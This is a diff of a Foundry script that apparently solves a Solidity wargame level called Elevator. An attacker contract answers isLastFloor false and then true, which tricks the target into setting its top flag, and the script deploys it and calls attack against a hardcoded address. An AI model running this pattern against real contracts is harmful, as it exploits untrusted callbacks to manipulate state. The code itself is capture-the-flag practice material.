@@ -5,31 +5,41 @@ import "../src/Elevator.sol";
 import "forge-std/Script.sol";
 import "forge-std/console.sol";
 
-contract MyBuilding {
+contract BuildingContract {
+    bool once_called = false;
+    Elevator elevatorInstance;
 
-    bool private mySwitch;
-    Elevator public elevatorInstance = Elevator(0x50C677101906d05bD64e0e8b923B93dBDAfC64D3);
-
-    function startAttack() external {
-        elevatorInstance.goTo(0);
+    constructor (Elevator _elevatorInstance) {
+        elevatorInstance = _elevatorInstance;
     }
 
-    function isLastFloor(uint _floor) external returns (bool) {
-        if(!mySwitch){
-            mySwitch = true;
-            return false;
-        } else {
+    function isLastFloor(uint256 f) external returns (bool) {
+        if (once_called)
             return true;
-        }
+        once_called = true;
+        return false;
+    }
+
+    function attack() external {
+        elevatorInstance.goTo(uint256(3));
     }
 }
 
 contract ElevatorSolution is Script {
 
+    Elevator public elevatorInstance = Elevator(0x5dfdE55a59E93A5EA2BC7FfEA0Dc1048A3C1d5E2);
+
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        MyBuilding myBuilding = new MyBuilding();
-        myBuilding.startAttack();
+        
+        console.logBool(elevatorInstance.top());
+
+        BuildingContract attacker = new BuildingContract(elevatorInstance);
+        attacker.attack();
+        
+
+        console.logBool(elevatorInstance.top());
+
         vm.stopBroadcast();
     }
 }
